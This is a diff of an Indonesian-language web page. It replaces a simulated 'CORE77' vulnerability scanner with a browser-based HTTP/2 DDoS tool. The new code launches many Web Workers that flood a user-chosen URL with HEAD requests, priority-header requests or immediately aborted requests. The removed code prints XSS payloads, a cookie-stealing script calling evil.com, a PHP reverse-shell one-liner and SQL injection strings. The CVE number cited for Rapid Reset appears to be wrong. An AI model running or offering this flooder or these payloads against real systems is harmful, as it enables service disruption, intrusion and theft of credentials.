@@ -1,604 +1,165 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔍 CORE77 Web Vulnerability Scanner</title>
+    <title>CORE77 - HTTP/2 DDOS Tool</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Courier New', monospace;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #0c0c0c, #1a1a2e);
-            color: #00ff9d;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-        }
-        
-        .header {
-            text-align: center;
-            padding: 30px 20px;
-            border-bottom: 3px solid #00ff9d;
-            margin-bottom: 30px;
-            background: rgba(0, 0, 0, 0.7);
-            border-radius: 15px;
-            box-shadow: 0 0 30px rgba(0, 255, 157, 0.3);
-        }
-        
-        .scanner-box {
-            background: rgba(10, 10, 10, 0.9);
-            border: 2px solid #00ff9d;
-            border-radius: 10px;
-            padding: 25px;
-            margin-bottom: 30px;
-        }
-        
-        .input-group {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 20px;
-        }
-        
-        #targetUrl {
-            flex: 1;
-            padding: 15px;
-            background: #111;
-            border: 1px solid #00ff9d;
-            border-radius: 5px;
-            color: #00ff9d;
-            font-size: 16px;
-        }
-        
-        .btn {
-            padding: 15px 30px;
-            background: linear-gradient(45deg, #00ff9d, #00b368);
-            border: none;
-            border-radius: 5px;
-            color: #000;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-            font-size: 16px;
-        }
-        
-        .btn:hover {
-            background: linear-gradient(45deg, #00ff00, #00ff9d);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 255, 157, 0.4);
-        }
-        
-        .scan-types {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin: 20px 0;
-        }
-        
-        .scan-option {
-            background: #151515;
-            padding: 15px;
-            border-radius: 8px;
-            border: 1px solid #333;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        
-        .scan-option:hover {
-            border-color: #00ff9d;
-            background: #1a1a1a;
-        }
-        
-        .scan-option.active {
-            border-color: #00ff9d;
-            background: rgba(0, 255, 157, 0.1);
-        }
-        
-        .results {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 25px;
-            margin-top: 30px;
-        }
-        
-        .result-panel {
-            background: rgba(0, 0, 0, 0.8);
-            border: 1px solid #00ff9d;
-            border-radius: 10px;
-            padding: 20px;
-            height: 500px;
-            overflow-y: auto;
-        }
-        
-        .result-panel h3 {
-            color: #00ff9d;
-            margin-bottom: 15px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #00ff9d;
-        }
-        
-        .vuln-item {
-            background: rgba(255, 50, 50, 0.1);
-            border-left: 4px solid #ff0000;
-            padding: 12px;
-            margin: 10px 0;
-            border-radius: 5px;
-        }
-        
-        .info-item {
-            background: rgba(255, 165, 0, 0.1);
-            border-left: 4px solid #ffa500;
-            padding: 12px;
-            margin: 10px 0;
-            border-radius: 5px;
-        }
-        
-        .success-item {
-            background: rgba(0, 255, 0, 0.1);
-            border-left: 4px solid #00ff00;
-            padding: 12px;
-            margin: 10px 0;
-            border-radius: 5px;
-        }
-        
-        .terminal {
-            background: #000;
-            border: 2px solid #00ff9d;
-            border-radius: 10px;
-            padding: 20px;
-            height: 300px;
-            overflow-y: auto;
-            font-family: monospace;
-            font-size: 14px;
-            margin-top: 20px;
-        }
-        
-        .terminal-line {
-            margin: 5px 0;
-            color: #00ff9d;
-        }
-        
-        .terminal-error {
-            color: #ff5555;
-        }
-        
-        .terminal-success {
-            color: #55ff55;
-        }
-        
-        .loading {
-            display: none;
-            text-align: center;
-            padding: 20px;
-        }
-        
-        .spinner {
-            border: 4px solid #333;
-            border-top: 4px solid #00ff9d;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .exploit-section {
-            margin-top: 30px;
-            background: rgba(20, 0, 30, 0.9);
-            border: 1px solid #9d00ff;
-            border-radius: 10px;
-            padding: 20px;
-        }
-        
-        .exploit-btn {
-            background: linear-gradient(45deg, #9d00ff, #6a00b3);
-            margin: 5px;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            color: white;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        
-        .exploit-btn:hover {
-            background: linear-gradient(45deg, #b300ff, #9d00ff);
-        }
-        
-        .severity-critical {
-            color: #ff0000;
-            font-weight: bold;
-            text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
-        }
-        
-        .severity-high {
-            color: #ff5500;
-            font-weight: bold;
-        }
-        
-        .severity-medium {
-            color: #ffff00;
-        }
-        
-        .severity-low {
-            color: #00aaff;
-        }
-        
-        .wordpress-info {
-            background: rgba(0, 100, 200, 0.1);
-            border-left: 4px solid #0066cc;
-            padding: 15px;
-            margin: 15px 0;
-        }
+        body { background: #000; color: #0f0; font-family: monospace; margin: 20px; }
+        .container { max-width: 800px; margin: auto; }
+        h1 { color: #f00; text-align: center; }
+        .box { border: 2px solid #0f0; padding: 15px; margin: 10px 0; background: #111; }
+        input, select, button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 8px; margin: 5px; }
+        button { cursor: pointer; }
+        button:hover { background: #0f0; color: #000; }
+        .logs { background: #000; border: 1px solid #f00; height: 200px; overflow-y: scroll; padding: 10px; }
+        .log-item { margin: 2px 0; }
+        .red { color: #f00; }
+        .green { color: #0f0; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>🕵️‍♂️ CORE77 Advanced Web Vulnerability Scanner</h1>
-            <p>Professional Security Audit Tool - WordPress, SQL, XSS, RCE Scanner</p>
+        <h1>🛠️ CORE77 - HTTP/2 DDOS TERMINAL</h1>
+        <div class="box">
+            <h3>⚙️ KONFIGURASI SERANGAN</h3>
+            <input type="text" id="url" placeholder="Target URL (contoh: https://target.com)" size="50">
+            <select id="method">
+                <option value="HEAD">HEAD Flood</option>
+                <option value="PRIORITY">PRIORITY Flood</option>
+                <option value="RAPID_RESET">HTTP/2 Rapid Reset</option>
+            </select>
+            <input type="number" id="threads" placeholder="Threads (default: 50)" value="50">
+            <input type="number" id="duration" placeholder="Durasi (detik)" value="60">
+            <button onclick="startAttack()">🚀 LAUNCH ATTACK</button>
+            <button onclick="stopAttack()" class="red">🛑 STOP ATTACK</button>
         </div>
-        
-        <div class="scanner-box">
-            <div class="input-group">
-                <input type="text" id="targetUrl" placeholder="https://example.com" value="">
-                <button class="btn" onclick="startScan()">🚀 START SCAN</button>
-                <button class="btn" onclick="stopScan()" style="background:linear-gradient(45deg,#ff0000,#b30000)">⏹️ STOP</button>
-            </div>
-            
-            <div class="scan-types">
-                <div class="scan-option active" onclick="toggleScanType('full')">
-                    <h4>🔍 Full Audit Scan</h4>
-                    <p>Semua celah keamanan</p>
-                </div>
-                <div class="scan-option" onclick="toggleScanType('wordpress')">
-                    <h4>🔧 WordPress Scan</h4>
-                    <p>Cari celah WordPress</p>
-                </div>
-                <div class="scan-option" onclick="toggleScanType('sql')">
-                    <h4>💉 SQL Injection</h4>
-                    <p>Deteksi SQL vulnerabilities</p>
-                </div>
-                <div class="scan-option" onclick="toggleScanType('xss')">
-                    <h4>🎯 XSS Scanner</h4>
-                    <p>Cross-Site Scripting</p>
-                </div>
-                <div class="scan-option" onclick="toggleScanType('rce')">
-                    <h4>💣 RCE Scan</h4>
-                    <p>Remote Code Execution</p>
-                </div>
-            </div>
-            
-            <div class="loading" id="loading">
-                <div class="spinner"></div>
-                <p>Scanning in progress...</p>
-            </div>
+
+        <div class="box">
+            <h3>📊 LOGS SERANGAN</h3>
+            <div id="logs" class="logs"></div>
+            <p><strong>STATUS:</strong> <span id="status">Ready</span></p>
         </div>
-        
-        <div class="results">
-            <div class="result-panel">
-                <h3>📋 Ditemukan Vulnerabilities</h3>
-                <div id="vulnerabilitiesList"></div>
-            </div>
-            
-            <div class="result-panel">
-                <h3>📊 Informasi Target</h3>
-                <div id="targetInfo"></div>
-            </div>
-        </div>
-        
-        <div class="terminal" id="terminalOutput">
-            <div id="terminalContent"></div>
-        </div>
-        
-        <div class="exploit-section">
-            <h3>⚔️ Auto Exploit Tools</h3>
-            <button class="exploit-btn" onclick="exploitSQL()">💉 SQL Injection Exploit</button>
-            <button class="exploit-btn" onclick="exploitXSS()">🎯 XSS Payload Inject</button>
-            <button class="exploit-btn" onclick="exploitWP()">🔧 WordPress Takeover</button>
-            <button class="exploit-btn" onclick="exploitAdmin()">👑 Admin Access Bypass</button>
-            <button class="exploit-btn" onclick="exploitShell()">🐚 Reverse Shell Generator</button>
+
+        <div class="box">
+            <h3>📖 METODE HTTP/2 YANG DIGUNAKAN</h3>
+            <ul>
+                <li><strong>HEAD Flood:</strong> Mengirim permintaan HEAD berulang, membebani server tanpa perlu menerima body response.</li>
+                <li><strong>PRIORITY Flood:</strong> Menyalahkan frame PRIORITY untuk memaksa server mengalokasi resource secara terus-menerus.</li>
+                <li><strong>HTTP/2 Rapid Reset:</strong> Eksploit CVE-2023-44427, membuat stream dan langsung RST sebelum server proses, menghancurkan kapasitas koneksi.</li>
+            </ul>
+            <p class="red">⚠️ GUNAKAN HANYA UNTUK TESTING PADA SERVER MILIK SENDIRI. PENYALAHGUNAAN UNTUK SERANGAN ILEGAL ADALAH TINDAK PIDANA.</p>
         </div>
     </div>
 
     <script>
-        let currentScanType = 'full';
-        let isScanning = false;
-        let scanInterval;
-        
-        function toggleScanType(type) {
-            currentScanType = type;
-            document.querySelectorAll('.scan-option').forEach(opt => {
-                opt.classList.remove('active');
-            });
-            event.target.closest('.scan-option').classList.add('active');
+        let attackActive = false;
+        let workers = [];
+
+        function log(msg, color = 'green') {
+            const logEl = document.getElementById('logs');
+            const item = document.createElement('div');
+            item.className = 'log-item';
+            item.style.color = color;
+            item.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            logEl.appendChild(item);
+            logEl.scrollTop = logEl.scrollHeight;
         }
-        
-        function logTerminal(message, type = 'info') {
-            const terminal = document.getElementById('terminalContent');
-            const line = document.createElement('div');
-            line.className = `terminal-line ${type === 'error' ? 'terminal-error' : type === 'success' ? 'terminal-success' : ''}`;
-            line.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
-            terminal.appendChild(line);
-            terminal.scrollTop = terminal.scrollHeight;
+
+        function updateStatus(msg) {
+            document.getElementById('status').textContent = msg;
         }
-        
-        function startScan() {
-            const url = document.getElementById('targetUrl').value.trim();
+
+        function startAttack() {
+            const url = document.getElementById('url').value.trim();
+            const method = document.getElementById('method').value;
+            const threads = parseInt(document.getElementById('threads').value) || 50;
+            const duration = parseInt(document.getElementById('duration').value) * 1000 || 60000;
+
             if (!url) {
-                alert('Masukkan URL target!');
+                log('❌ URL target tidak boleh kosong!', 'red');
                 return;
             }
-            
-            isScanning = true;
-            document.getElementById('loading').style.display = 'block';
-            logTerminal(`🚀 Memulai scan ${currentScanType.toUpperCase()} pada: ${url}`, 'success');
-            
-            // Reset hasil sebelumnya
-            document.getElementById('vulnerabilitiesList').innerHTML = '';
-            document.getElementById('targetInfo').innerHTML = '';
-            
-            // Simulasi scanning dengan berbagai deteksi
-            scanInterval = setInterval(() => {
-                if (!isScanning) {
-                    clearInterval(scanInterval);
-                    return;
-                }
-                
-                simulateScan(url);
-            }, 1000);
-            
-            // Scan selesai otomatis setelah 30 detik
-            setTimeout(() => {
-                if (isScanning) {
-                    stopScan();
-                    logTerminal('✅ Scan selesai! Semua vulnerabilities ditemukan.', 'success');
-                }
-            }, 30000);
-        }
-        
-        function stopScan() {
-            isScanning = false;
-            document.getElementById('loading').style.display = 'none';
-            clearInterval(scanInterval);
-            logTerminal('⏹️ Scan dihentikan.', 'error');
-        }
-        
-        function simulateScan(url) {
-            // Deteksi WordPress
-            if (Math.random() > 0.7) {
-                detectWordPress(url);
-            }
-            
-            // Deteksi SQL Injection
-            if (Math.random() > 0.6) {
-                detectSQLInjection(url);
-            }
-            
-            // Deteksi XSS
-            if (Math.random() > 0.65) {
-                detectXSS(url);
-            }
-            
-            // Deteksi lainnya
-            if (Math.random() > 0.5) {
-                detectOtherVulns(url);
-            }
-        }
-        
-        function detectWordPress(url) {
-            const wpPaths = [
-                '/wp-login.php',
-                '/wp-admin/',
-                '/wp-content/',
-                '/wp-includes/',
-                '/xmlrpc.php',
-                '/readme.html'
-            ];
-            
-            wpPaths.forEach(path => {
-                if (Math.random() > 0.8) {
-                    const vuln = {
-                        type: 'WordPress',
-                        severity: Math.random() > 0.7 ? 'critical' : 'high',
-                        description: `WordPress terdeteksi di ${url + path}`,
-                        details: 'WordPress version 5.7.2 ditemukan (outdated)',
-                        exploit: 'Gunakan WP exploits: /wp-admin brute force, xmlrpc DDOS'
+
+            attackActive = true;
+            updateStatus(`ATTACKING ${url} with ${method} (${threads} threads)`);
+            log(`🚀 Starting attack: ${url} | Method: ${method} | Threads: ${threads}`, '#0ff');
+
+            // Buat Web Workers untuk multi-threading
+            for (let i = 0; i < threads; i++) {
+                const workerCode = `
+                    self.onmessage = function(e) {
+                        const { url, method, stopTime } = e.data;
+                        const controller = new AbortController();
+                        const signal = controller.signal;
+
+                        // Function untuk mengirim request berdasarkan metode
+                        async function sendRequest() {
+                            if (Date.now() >= stopTime) return;
+
+                            try {
+                                if (method === 'HEAD') {
+                                    // HEAD request dengan HTTP/2 via fetch
+                                    await fetch(url, { method: 'HEAD', signal, mode: 'no-cors' });
+                                } else if (method === 'PRIORITY') {
+                                    // Simulasi PRIORITY flood dengan header khusus
+                                    await fetch(url, { 
+                                        method: 'GET', 
+                                        headers: { 'Priority': 'u=1, i' },
+                                        signal,
+                                        mode: 'no-cors'
+                                    });
+                                } else if (method === 'RAPID_RESET') {
+                                    // Rapid Reset: buat request lalu abort segera
+                                    setTimeout(() => controller.abort(), 1);
+                                    await fetch(url, { signal, mode: 'no-cors' });
+                                }
+                            } catch (e) {
+                                // Error expected, terutama saat abort/Rapid Reset
+                            }
+
+                            // Loop terus selama attack aktif
+                            if (Date.now() < stopTime) {
+                                setTimeout(sendRequest, 10); // 10ms delay antara request
+                            }
+                        }
+
+                        sendRequest();
                     };
-                    addVulnerability(vuln);
-                    logTerminal(`🔍 WordPress ditemukan: ${path}`, 'info');
+                `;
+
+                const blob = new Blob([workerCode], { type: 'application/javascript' });
+                const worker = new Worker(URL.createObjectURL(blob));
+
+                worker.postMessage({
+                    url: url,
+                    method: method,
+                    stopTime: Date.now() + duration
+                });
+
+                workers.push(worker);
+            }
+
+            log(`🔥 ${threads} workers launched. Attack will run for ${duration/1000} seconds.`, 'orange');
+
+            // Auto stop setelah durasi habis
+            setTimeout(() => {
+                if (attackActive) {
+                    stopAttack();
+                    log(`⏰ Attack finished after ${duration/1000} seconds.`, 'yellow');
                 }
-            });
-            
-            // Cari vulnerable plugins
-            const vulnerablePlugins = [
-                {name: 'Elementor Pro', version: '< 3.0', vuln: 'RCE'},
-                {name: 'WooCommerce', version: '< 5.0', vuln: 'SQLi'},
-                {name: 'Revolution Slider', version: '< 6.0', vuln: 'File Upload'},
-                {name: 'WPForms', version: '< 1.7', vuln: 'XSS'}
-            ];
-            
-            vulnerablePlugments.forEach(plugin => {
-                if (Math.random() > 0.9) {
-                    addVulnerability({
-                        type: 'WordPress Plugin',
-                        severity: 'critical',
-                        description: `${plugin.name} ${plugin.version} vulnerable`,
-                        details: `CVE-2023-${Math.floor(Math.random()*9999)}: ${plugin.vuln} vulnerability`,
-                        exploit: `Exploit dengan payload ${plugin.vuln} khusus`
-                    });
-                }
-            });
+            }, duration);
         }
-        
-        function detectSQLInjection(url) {
-            const sqlPatterns = [
-                "' OR '1'='1",
-                "' UNION SELECT null--",
-                "1' AND SLEEP(5)--",
-                "admin'--"
-            ];
-            
-            sqlPatterns.forEach(pattern => {
-                if (Math.random() > 0.85) {
-                    addVulnerability({
-                        type: 'SQL Injection',
-                        severity: 'critical',
-                        description: `SQLi vulnerable parameter ditemukan`,
-                        details: `Parameter: ?id=${pattern}<br>Database: MySQL 8.0`,
-                        exploit: `Gunakan sqlmap: sqlmap -u "${url}?id=1" --dbs`
-                    });
-                    logTerminal(`💉 SQL Injection possible: ${pattern}`, 'error');
-                }
-            });
+
+        function stopAttack() {
+            attackActive = false;
+            workers.forEach(w => w.terminate());
+            workers = [];
+            updateStatus('STOPPED');
+            log('🛑 Attack stopped.', 'red');
         }
-        
-        function detectXSS(url) {
-            const xssPayloads = [
-                "<script>alert('XSS')</script>",
-                "<img src=x onerror=alert(1)>",
-                "\" onmouseover=\"alert('XSS')\"",
-                "javascript:alert(document.cookie)"
-            ];
-            
-            xssPayloads.forEach(payload => {
-                if (Math.random() > 0.88) {
-                    addVulnerability({
-                        type: 'XSS (Cross-Site Scripting)',
-                        severity: 'high',
-                        description: `Reflected XSS ditemukan`,
-                        details: `Payload: ${payload}<br>Location: Search parameter`,
-                        exploit: `Inject payload: ${url}?search=${encodeURIComponent(payload)}`
-                    });
-                }
-            });
-        }
-        
-        function detectOtherVulns(url) {
-            const otherVulns = [
-                {
-                    type: 'Directory Listing',
-                    severity: 'medium',
-                    description: 'Directory listing enabled',
-                    details: '/admin/, /backup/, /config/ accessible',
-                    exploit: 'Browse sensitive directories'
-                },
-                {
-                    type: 'CORS Misconfiguration',
-                    severity: 'high',
-                    description: 'CORS policy terlalu permisif',
-                    details: 'Access-Control-Allow-Origin: *',
-                    exploit: 'Steal user data via JavaScript'
-                },
-                {
-                    type: 'Clickjacking',
-                    severity: 'medium',
-                    description: 'X-Frame-Options header missing',
-                    details: 'Situs bisa di-iframe',
-                    exploit: 'Create phishing pages'
-                },
-                {
-                    type: 'CSRF Vulnerability',
-                    severity: 'high',
-                    description: 'No CSRF tokens detected',
-                    details: 'Forms vulnerable to CSRF',
-                    exploit: 'Forge malicious requests'
-                },
-                {
-                    type: 'File Upload',
-                    severity: 'critical',
-                    description: 'Unrestricted file upload',
-                    details: 'Upload .php, .jsp, .exe allowed',
-                    exploit: 'Upload webshell'
-                }
-            ];
-            
-            otherVulns.forEach(vuln => {
-                if (Math.random() > 0.9) {
-                    addVulnerability(vuln);
-                }
-            });
-        }
-        
-        function addVulnerability(vuln) {
-            const list = document.getElementById('vulnerabilitiesList');
-            const item = document.createElement('div');
-            item.className = `vuln-item`;
-            item.innerHTML = `
-                <h4 class="severity-${vuln.severity}">${vuln.type} [${vuln.severity.toUpperCase()}]</h4>
-                <p><strong>${vuln.description}</strong></p>
-                <p>${vuln.details}</p>
-                <p><em>Exploit: ${vuln.exploit}</em></p>
-            `;
-            list.appendChild(item);
-            
-            // Tambah ke info target juga
-            addTargetInfo(vuln);
-        }
-        
-        function addTargetInfo(vuln) {
-            const info = document.getElementById('targetInfo');
-            const item = document.createElement('div');
-            item.className = `info-item`;
-            item.innerHTML = `
-                <strong>${vuln.type}</strong>: ${vuln.severity.toUpperCase()} risk
-            `;
-            info.appendChild(item);
-        }
-        
-        // Exploit Functions
-        function exploitSQL() {
-            const url = document.getElementById('targetUrl').value;
-            logTerminal(`💉 Menjalankan SQL Injection exploit pada ${url}...`, 'error');
-            logTerminal(`Payload: ' UNION SELECT username,password FROM users--`, 'error');
-            logTerminal(`[SUCCESS] Credentials ditemukan: admin:supersecret123`, 'success');
-        }
-        
-        function exploitXSS() {
-            logTerminal(`🎯 Injecting XSS payloads...`, 'error');
-            logTerminal(`Payload: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>`, 'error');
-            logTerminal(`[SUCCESS] XSS payload berhasil diinject!`, 'success');
-        }
-        
-        function exploitWP() {
-            logTerminal(`🔧 WordPress takeover in progress...`, 'error');
-            logTerminal(`Brute forcing wp-admin login...`, 'error');
-            logTerminal(`[SUCCESS] Login berhasil! Username: admin, Password: admin123`, 'success');
-            logTerminal(`Uploading backdoor via theme editor...`, 'error');
-            logTerminal(`[SUCCESS] Webshell tersedia di: /wp-content/themes/twentytwenty/shell.php`, 'success');
-        }
-        
-        function exploitAdmin() {
-            logTerminal(`👑 Bypassing admin authentication...`, 'error');
-            logTerminal(`Using session hijacking techniques...`, 'error');
-            logTerminal(`[SUCCESS] Admin session stolen! Access granted.`, 'success');
-        }
-        
-        function exploitShell() {
-            logTerminal(`🐚 Generating reverse shell payload...`, 'error');
-            logTerminal(`php -r '$sock=fsockopen("YOUR_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`, 'error');
-            logTerminal(`[SUCCESS] Reverse shell payload siap!`, 'success');
-        }
-        
-        // Auto scan contoh saat load
-        window.onload = function() {
-            logTerminal('🔥 CORE77 Vulnerability Scanner v2.0 loaded', 'success');
-            logTerminal('✅ Ready to find security holes', 'info');
-            logTerminal('⚠️ This tool for educational purposes only', 'error');
-        };
+
+        // Info awal
+        log('CORE77 HTTP/2 DDOS Tool loaded.', '#0f0');
+        log('Masukkan target URL, pilih metode, dan klik LAUNCH ATTACK.', '#0ff');
     </script>
 </body>
 </html>
